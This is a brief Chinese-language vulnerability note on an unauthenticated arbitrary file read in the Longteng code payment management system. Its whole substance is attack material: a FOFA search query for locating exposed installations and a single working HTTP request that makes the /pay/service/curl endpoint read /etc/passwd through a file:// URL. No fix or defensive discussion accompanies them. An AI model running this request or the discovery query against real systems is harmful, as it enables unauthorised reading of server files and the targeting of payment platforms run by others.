# 龙腾码支付payservicecurl任意文件读取

# 一、漏洞简介
龙腾码支付管理系统存在未授权的任意文件读取漏洞

# 二、影响版本
+ 龙腾码支付

# 三、资产测绘
+ fofa`body="/epaydoc/epaydoc.php"`

# 四、漏洞复现
```plain
GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
```
